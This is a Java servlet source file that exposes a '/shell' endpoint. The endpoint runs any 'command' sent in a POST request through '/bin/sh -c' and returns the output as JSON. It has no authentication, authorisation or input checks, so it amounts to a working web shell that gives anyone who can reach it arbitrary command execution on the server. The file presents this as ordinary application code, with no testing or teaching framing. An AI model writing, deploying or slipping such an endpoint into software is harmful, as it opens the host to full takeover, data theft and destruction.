package com.example;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

@WebServlet("/shell")
public class RunShellCommandServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String command = request.getParameter("command");

        response.setContentType("application/json;charset=UTF-8");
        PrintWriter out = response.getWriter();

        if (command == null || command.trim().isEmpty()) {
            out.write("{\"status\":\"error\",\"message\":\"No command provided.\"}");
            out.flush();
            return;
        }

        command = command.trim();

        Process process = null;
        int exitCode = -1;
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
            pb.redirectErrorStream(true);
            process = pb.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            exitCode = process.waitFor();
        } catch (Exception e) {
            output.append("Error executing command: ").append(e.getMessage()).append("\n");
        }

        String safeOutput = output.toString()
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "")
                .replace("\n", "\\n");

        out.write("{\"status\":\"success\",\"exitCode\":" + exitCode + ",\"output\":\"" + safeOutput + "\"}");
        out.flush();
    }
}
